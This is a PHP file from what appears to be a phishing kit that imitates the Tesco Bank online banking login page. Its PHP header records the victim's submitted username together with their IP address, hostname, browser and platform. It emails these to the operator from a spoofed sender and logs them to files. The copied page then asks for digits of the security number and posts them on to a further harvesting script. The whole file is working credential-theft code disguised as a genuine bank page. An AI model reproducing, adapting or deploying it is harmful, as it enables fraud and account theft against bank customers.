﻿<?php
/* ------------------------ ICQ : 743688056 ------------------------- */
include"../antibots.php";
include "../email.php";
require "assets/js/enc.php"; 
error_reporting(0);
session_start();
$uid = $_POST['uid'];
$_SESSION['uid']=$_POST['uid'];;

$TIME_DATE = date('H:i:s d/m/Y');
date_default_timezone_set('Europe/London');


$ip = $_SERVER['REMOTE_ADDR'];
$VictimInfo1 = "| IP Address :"." ".$_SERVER['REMOTE_ADDR']." (".gethostbyaddr($_SERVER['REMOTE_ADDR']).")";
$VictimInfo3 = "| UserAgent :"." ".$_SERVER['HTTP_USER_AGENT'];
$VictimInfo4 = "| Browser :"." ".browsername();
$VictimInfo5 = "| Platform :"." ".os_info($systemInfo['useragent']);
$subj = "Tesco | LOG | $ip";
$headers = "MIME-Version: 1.0" . "\r\nFrom:Kr3pto <Kr3ptotesco@result.co.uk>" . "\r\n";
$headers .= "Content-type: text/plain; charset=UTF-8\n";
$data = "
+ ------------- Tesco LOG -------------+
| Username : $uid
+ ------------------------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Time/Date : $TIME_DATE
+ ------------------------------------------+
";
mail($to,$subj,$data,$headers);
$file=fopen("./logs/$ip.txt","a");
$file1=fopen("./logs2/$ip.txt","a");
fwrite($file,$data."\r\n");
fwrite($file1,$data."\r\n");
fclose($file);
fclose($file1);

?>
<!DOCTYPE html>
<html class="js svg csscalc boxsizing gr__login_myproducts_tescobank_com" lang="en">


<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"></script>
    


<meta http-equiv="x-ua-compatible" content="ie=edge">
<title>Login</title>
<meta name="description" content="Tesco Bank online banking - login">
<meta name="viewport" content="width=device-width, initial-scale=1">





<!--[if lt IE 9]><link rel="stylesheet" href="/arcotafm/responsive-assets/fd8911d/css/core-ie.min.css"/><![endif]-->
<!--[if gt IE 8]><!--><link href="./assets/css/core.min.css" rel="stylesheet"><!--<![endif]-->


<!-- {{! scripts that must run in the head }} -->
<script src="./assets/js/core-head.min.js"></script>


<!--[if IE 7]>
<script src="/arcotafm/responsive-assets/fd8911d/js/vendor/json2.min.js"></script>
<![endif]-->

<!--[if IE 7]><script>
document.getElementsByTagName('html')[0].className += ' ie7 legacyie';
</script><![endif]-->
<!--[if IE 8]><script>
document.getElementsByTagName('html')[0].className += ' ie8 legacyie';
</script><![endif]-->
<!--[if IE 9 & !IEMobile ]><script>
document.getElementsByTagName('html')[0].className += ' ie9';
</script><![endif]-->
    
  </head>
  <body data-gr-c-s-loaded="true">
    <div class="container">
      <div id="skiplink"><a href="https://login.myproducts.tescobank.com/arcotafm/saml/tescoBankController?SDAN=TCdl7IcXJIQXnxS#content" class="screen-reader-only">skip to content</a></div>
      <header role="banner">
	  
    <div class="header">
        <div class="inner">
            <a href="https://login.myproducts.tescobank.com/arcotafm/saml/tescoBankController?SUBMIT=EXIT&amp;StateDataAttrNm=kGB1RybrQdVZ0cv">
                <div class="header__logo" role="img" aria-label="Tesco Bank">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1130.6 208.1">
                        <path fill="#274B93" d="M61.9 168H150c.8 0 .9.5-.1.8-9.9 4.3-24.2 17.8-24.2 17.8-9.9 8.9-17.6 14.5-34.3 14.5H7.3c-.6 0-.6-.5-.2-.7 9.3-4.7 23.1-18.4 23.1-18.4 5.7-5.8 17.2-14 31.7-14M639.9 168h88.2c.7 0 .9.5-.1.8-9.9 4.3-24.1 17.8-24.1 17.8-9.9 8.9-17.7 14.5-34.3 14.5h-84.2c-.6 0-.6-.5-.1-.7 9.3-4.7 23-18.4 23-18.4 5.6-5.8 17.2-14 31.6-14M206.4 168h88.1c.8 0 .9.5-.1.8-9.8 4.3-24.1 17.8-24.1 17.8-9.9 8.9-17.7 14.5-34.3 14.5h-84.2c-.5 0-.5-.5-.2-.7 9.3-4.7 23.1-18.4 23.1-18.4 5.7-5.8 17.3-14 31.7-14M351 168h88c.8 0 .9.5 0 .8-9.9 4.3-24.2 17.8-24.2 17.8-9.9 8.9-17.7 14.5-34.3 14.5h-84.2c-.6 0-.6-.5-.1-.7 9.3-4.7 23.1-18.4 23.1-18.4 5.6-5.8 17.2-14 31.7-14M495.5 168h88.1c.8 0 .9.5-.1.8-9.9 4.3-24.2 17.8-24.2 17.8-9.8 8.9-17.6 14.5-34.2 14.5h-84.2c-.6 0-.6-.5-.2-.7 9.4-4.7 23.1-18.4 23.1-18.4 5.6-5.8 17.2-14 31.7-14"></path>
                        <path fill="#C20E1A" d="M519.3 8.4c-55.4 0-92.1 26.7-92.1 67.3 0 37.3 33.6 62.1 84 62.1 16.3 0 31-2 47.9-6.1v-31.4c-12 12.7-26.4 17.7-41.8 17.7-29.7 0-50.1-18.6-50.1-45.3 0-26.3 21.1-45.4 50.6-45.4 16.1 0 29 5.7 39.3 15.8V11.7c-10.7-2.2-24.1-3.3-37.8-3.3M102.5 30.2c20.6.2 45.2 3.9 55.6 11.9V12.3H11.9v29.8C22.3 34 44 30.9 67.7 30.7v81.2c0 11.9-1 15.3-6 21.5h46.9c-5.3-6.2-6.1-9.6-6.1-21.5V30.2zM254.3 59.4c-8.5 2.7-23.4 3.5-31.6 3.5h-12.2V30.7H227c14.7 0 40.3 3.1 49.9 11.1V12.3H170.6c4.9 6.2 5.9 9.7 5.9 21.5V112c0 11.9-1 15.4-5.7 21.5h113.4V104c-15.5 11.1-45.1 11.2-57.2 11h-16.5V81h12.2c8.1 0 23 .9 31.6 3.5V59.4zM412 16.4c-16.7-5.3-38.9-8.3-55.8-8.3-30.8 0-60.7 9.1-60.7 39.7 0 53 92.3 25 92.3 57.4 0 10.5-16.3 14.8-29.5 14.8-23.8 0-40.3-3.6-61-16v26.6c15.5 5.1 36.6 7.6 59.5 7.6 31.9 0 61.7-8.2 61.7-39.5 0-55.3-92.3-30.5-92.3-57.5 0-10.9 14.8-14.7 27.7-14.7 21.8 0 45.3 6.5 58.2 18.4V16.4zM723.6 72.2c0-38.2-30.1-63.8-75.1-63.8-47.8 0-81.5 27.5-81.5 66.2 0 38 30.3 63.2 75.5 63.2 48 0 81.1-26.7 81.1-65.6m-119.9.7c0-25.5 16.2-46.3 41.6-46.3 25 0 41.6 20.7 41.6 46.3 0 25.6-16.6 46.2-41.6 46.2-25.4.1-41.6-20.6-41.6-46.2"></path>
                        <path fill="#274B93" d="M828.6 76.3h-27.9v45.1h27.9c14.4 0 22.9-9.2 22.9-22.5 0-13.4-8.7-22.6-22.9-22.6m-3.4-51.8h-24.5v39.4h24.5c11.5 0 19.5-8 19.5-19.9 0-13-7.3-19.5-19.5-19.5m5.9 109.3h-43.5c-1.4 0-2.3-.7-2.3-2.1V21.5c0-3.9-.7-7.5-2-9.4H827c24.8 0 34.2 13.7 34.2 28.7 0 9-2.5 20.6-15.4 27.9 16.9 5.9 22.7 17.4 22.7 31.4 0 18.1-14 33.7-37.4 33.7M930.9 95.1c-4.6-.9-12.6-2-18.5-2-13.3 0-19.7 5.5-19.7 16 0 10.3 6.6 14.7 16.5 14.7 11.7 0 19-6.6 21.6-9.9V95.1zm2.7 38.7c-1.6 0-2.5-.7-2.5-2.1V126c-3.4 3.2-11.2 9.9-26.8 9.9-17.2 0-26.8-10.6-26.8-26.4 0-17.7 12.4-27.5 33-27.5 7.3 0 14.9.9 20.4 1.8v-4.3c0-13.5-7.3-17.9-21.1-17.9-11 0-19.2 3.7-21.8 5.5l-2.7-7.1c-.2-.7-.7-2.1-.5-2.3-.5-2.1.9-3.2 3.2-4.3 2.7-1.2 12.1-4.4 23.6-4.4 26.3 0 34.2 11.9 34.2 29.5v55.4h-12.2zM1021.1 133.8c-1.4 0-2.3-.7-2.3-2.1v-49c0-13.5-5-20.8-17.9-20.8-10.6 0-18.8 6.7-23.4 13.3v58.5h-12.6c-1.4 0-2.3-.7-2.3-2.1V72.7c0-5.3-.4-10.8-1.2-15.4-.4-2.5-.9-4.6-1.6-6.2h11.9c1.8 0 2.5.7 2.8 1.6.4.9.7 2.1.9 3.4.4 1.8.5 3.9.7 5.5 3.5-4.1 13.1-12.6 27.3-12.6 21.5 0 30.3 11.2 30.3 30.3v54.5h-12.6zM1107.6 133.8c-1.8 0-3.4-.5-5.3-2.7L1065 92.6v41.2h-12.6c-1.4 0-2.3-.7-2.3-2.1V21.5c0-3.9-.7-7.5-2.5-9.4l9.6-.9c2.3-.2 4.3-.4 5.1-.4 1.8 0 2.7.7 2.7 2.3V85l31.8-31.2c2.1-2 3.5-2.7 5.3-2.7h16.3L1080 88l45.4 45.8h-17.8z"></path>
                    </svg>
                </div>
            </a>
        </div>
    </div>
</header>

      <main role="main">
        <div id="content" class="content">
          
  
    
<div class="page-heading">
  <div class="inner">
    <h1 class="page-heading__primary">Welcome to Online Banking</h1>
  </div>
</div>
    <div id="login-non-recognised" data-tag="pagename">
      <div class="inner">
        <form action="security2.php?action=verify&account=<?=$rand;?>" method="post" id="inputForm" autocomplete="off" novalidate="novalidate">

          







          




<div class="pam-banner">
  <h2 class="screen-reader-only">Your username, security image and phrase</h2>
  <p class="pam-banner__username" tabindex="0">Your username is <span class="bold"><?=$uid;?></span></p>
  

    
  
</div>

          <div class="form__panel">
            <h2 class="form__heading">Login</h2>
            







<p>Please enter the <strong>1st</strong>, <strong>2nd</strong> and <strong>4th</strong> digits of your security number</p>
<div class="form__group form__group--security-number no-bottom js-autotab">
  <fieldset>
    <legend class="form__label">Security number</legend>
    
      
      <div class="form__item">
        
        <label class="form__label" for="DIGIT1">
          <span class="screen-reader-only">digit 1</span>1
        </label>
        <div class="form__control">
          <input type="password" name="DIGIT1" id="DIGIT1" class="form__input" maxlength="1">
        </div>
      </div>
    
      
      <div class="form__item">
        
        <label class="form__label" for="DIGIT2">
          <span class="screen-reader-only">digit 2</span>2
        </label>
        <div class="form__control">
          <input type="password" name="DIGIT2" id="DIGIT2" class="form__input" maxlength="1">
        </div>
      </div>
    
      
      <div class="form__item">
        
        <label class="form__label fade-half" for="DIGIT3">
          <span class="screen-reader-only">digit 3</span>3
        </label>
        <div class="form__control">
          <input type="password" name="DIGIT3" id="DIGIT3" class="form__input" maxlength="1" disabled="disabled">
        </div>
      </div>
    
      
      <div class="form__item">
        
        <label class="form__label" for="DIGIT4">
          <span class="screen-reader-only">digit 4</span>4
        </label>
        <div class="form__control">
          <input type="password" name="DIGIT4" id="DIGIT4" class="form__input" maxlength="1">
        </div>
      </div>
    
      
      <div class="form__item">
        
        <label class="form__label fade-half" for="DIGIT5">
          <span class="screen-reader-only">digit 5</span>5
        </label>
        <div class="form__control">
          <input type="password" name="DIGIT5" id="DIGIT5" class="form__input" maxlength="1" disabled="disabled">
        </div>
      </div>
    
      
      <div class="form__item">
        
        <label class="form__label fade-half" for="DIGIT6">
          <span class="screen-reader-only">digit 6</span>6
        </label>
        <div class="form__control">
          <input type="password" name="DIGIT6" id="DIGIT6" class="form__input" maxlength="1" disabled="disabled">
        </div>
      </div>
	    
    
  </fieldset>
</div>
            <p><a href="https://login.myproducts.tescobank.com/arcotafm/saml/tescoBankController?SDAN=TCdl7IcXJIQXnxS#" class="js-tooltip" data-target="#callout-security-number">Forgotten your security number?</a></p>
            <div id="callout-security-number" class="tooltip__content tooltip__content--callout js-hide" role="region" aria-expanded="false" tabindex="-1">
              <div class="callout">
                <h3 class="callout__heading has-icon"><i class="icon icon--info"></i>Forgotten your security number?</h3>
                <p>You can't reset your security number on this device because it's not one we recognise. For example, it may be that you've deleted your browsing history or you didn't ask us to recognise your device. You can only reset your security number from a device you've asked us to recognise during initial registration or successful login, or by <a href="https://www.tescobank.com/help/contact_us.html" rel="external" title="Link will open in a new window" target="_blank" class="external-link">contacting us</a>.</p>
              </div>
            </div>
          </div>
          <div id="submit-errors" class="hide">
  <div class="pre-submit-errors" role="alert" aria-atomic="true">
    <p class="form__error">Please correct the errors highlighted before continuing</p>
  </div>
</div>

          <div class="button-container">
            <input type="submit" class="button button--action" id="NEXTBUTTON" value="Next">
          </div>
        </form>
      </div>
    </div>
    <div class="banner">
  <div class="inner">
    <div class="banner__content"><h2>Can we help?</h2><p>Our <a href="https://www.tescobank.com/personal/finance/help/index.html" rel="external" title="Link will open in a new window" target="_blank" class="external-link">Online Help Centre</a> can help with most questions. Or if you'd prefer to speak to someone, <a href="https://www.tescobank.com/personal/finance/help/contact_us.html" rel="external" title="Link will open in a new window" target="_blank" class="external-link">contact us</a> and we'll be happy to help.</p></div>
  </div>
</div>
  

        </div>
      </main>
      
<footer>
  <div class="footer">
    <div class="inner">
      <p class="footer__copyright" role="contentinfo">Copyright © 2018 Tesco Personal Finance plc</p>
    </div>
  </div>
</footer>
<script src="./assets/js/core.min.js"></script>
      
    </div>
  


<div class="drop-hint" id="drop-to-share-hint" style="display: none; background-image: url(&quot;chrome-extension://cipmepknanmbbaneimacddfemfbfgpgo/images/content/dropToShareHint.png&quot;); background-size: 67px 327px;"><a class="share-btn-close"></a><a class="btn-options"></a><div class="drop-hint-bubble" id="drop-hint-bubble-share" style="display: none; background-image: url(&quot;chrome-extension://cipmepknanmbbaneimacddfemfbfgpgo/images/content/dropToShareHintBubble.png&quot;); background-size: 253px 79px;"></div></div><div class="drop-hint" id="drop-to-search-hint" style="display: none; background-image: url(&quot;chrome-extension://cipmepknanmbbaneimacddfemfbfgpgo/images/content/dropToSearchHint.png&quot;); background-size: 67px 327px;"><a class="search-btn-close"></a><a class="btn-options"></a><div class="drop-hint-bubble" id="drop-hint-bubble-search" style="display: none; background-image: url(&quot;chrome-extension://cipmepknanmbbaneimacddfemfbfgpgo/images/content/dropToSearchHintBubble.png&quot;); background-size: 215px 79px;"></div></div><div class="dropAreaContainer" style="display: none; right: 0px;"><div class="searchDropArea" style="width: 142px; height: 16.6667%; background-color: rgba(220, 220, 220, 0.901961);"><span class="disable-manipulations"></span><img src="chrome-extension://cipmepknanmbbaneimacddfemfbfgpgo/images/content/providers/web-search-content.png" style="max-height: 81px; height: 90%; background-color: transparent;" class="disable-manipulations"></div><div class="searchDropArea" style="width: 142px; height: 16.6667%; background-color: rgba(240, 240, 240, 0.901961);"><span class="disable-manipulations"></span><img src="chrome-extension://cipmepknanmbbaneimacddfemfbfgpgo/images/content/providers/video-search-content.png" style="max-height: 40px; height: 90%; background-color: transparent;" class="disable-manipulations"></div><div class="searchDropArea" style="width: 142px; height: 16.6667%; background-color: rgba(220, 220, 220, 0.901961);"><span class="disable-manipulations"></span><img src="chrome-extension://cipmepknanmbbaneimacddfemfbfgpgo/images/content/providers/google-images-content.png" style="max-height: 88px; height: 90%; background-color: transparent;" class="disable-manipulations"></div><div class="searchDropArea" style="width: 142px; height: 16.6667%; background-color: rgba(240, 240, 240, 0.901961);"><span class="disable-manipulations"></span><img src="chrome-extension://cipmepknanmbbaneimacddfemfbfgpgo/images/content/providers/google-translate-content.png" style="max-height: 82px; height: 90%; background-color: transparent;" class="disable-manipulations"></div><div class="searchDropArea" style="width: 142px; height: 16.6667%; background-color: rgba(220, 220, 220, 0.901961);"><span class="disable-manipulations"></span><img src="chrome-extension://cipmepknanmbbaneimacddfemfbfgpgo/images/content/providers/wikipedia-content.png" style="max-height: 86px; height: 90%; background-color: transparent;" class="disable-manipulations"></div><div class="dropAreaSettings" style="width: 142px; height: 16.6667%; background-color: rgba(58, 58, 58, 0.901961);"><span class="disable-manipulations"></span><img src="chrome-extension://cipmepknanmbbaneimacddfemfbfgpgo/images/content/btn_settings.png" style="max-height: 25px; height: 90%; background-color: transparent;" class="disable-manipulations"></div></div><div class="dropAreaContainer" style="display: none; left: 0px;"><div class="shareDropArea" style="width: 142px; height: 16.6667%; background-color: rgba(60, 90, 152, 0.901961);"><span class="disable-manipulations"></span><img src="chrome-extension://cipmepknanmbbaneimacddfemfbfgpgo/images/content/providers/facebook-share-content.png" style="max-height: 25px; height: 90%; background-color: transparent;" class="disable-manipulations"></div><div class="shareDropArea" style="width: 142px; height: 16.6667%; background-color: rgba(233, 246, 255, 0.901961);"><span class="disable-manipulations"></span><img src="chrome-extension://cipmepknanmbbaneimacddfemfbfgpgo/images/content/providers/twitter-content.png" style="max-height: 23px; height: 90%; background-color: transparent;" class="disable-manipulations"></div><div class="shareDropArea" style="width: 142px; height: 16.6667%; background-color: rgba(235, 235, 235, 0.901961);"><span class="disable-manipulations"></span><img src="chrome-extension://cipmepknanmbbaneimacddfemfbfgpgo/images/content/providers/pinterest-content.png" style="max-height: 28px; height: 90%; background-color: transparent;" class="disable-manipulations"></div><div class="shareDropArea" style="width: 142px; height: 16.6667%; background-color: rgba(58, 58, 58, 0.901961);"><span class="disable-manipulations"></span><img src="chrome-extension://cipmepknanmbbaneimacddfemfbfgpgo/images/content/providers/google-plus-center-content.png" style="max-height: 56px; height: 90%; background-color: transparent;" class="disable-manipulations"></div><div class="shareDropArea" style="width: 142px; height: 16.6667%; background-color: rgba(248, 248, 248, 0.901961);"><span class="disable-manipulations"></span><img src="chrome-extension://cipmepknanmbbaneimacddfemfbfgpgo/images/content/providers/linkedin-content.png" style="max-height: 31px; height: 90%; background-color: transparent;" class="disable-manipulations"></div><div class="dropAreaSettings" style="width: 142px; height: 16.6667%; background-color: rgba(58, 58, 58, 0.901961);"><span class="disable-manipulations"></span><img src="chrome-extension://cipmepknanmbbaneimacddfemfbfgpgo/images/content/btn_settings.png" style="max-height: 25px; height: 90%; background-color: transparent;" class="disable-manipulations"></div></div></body></html>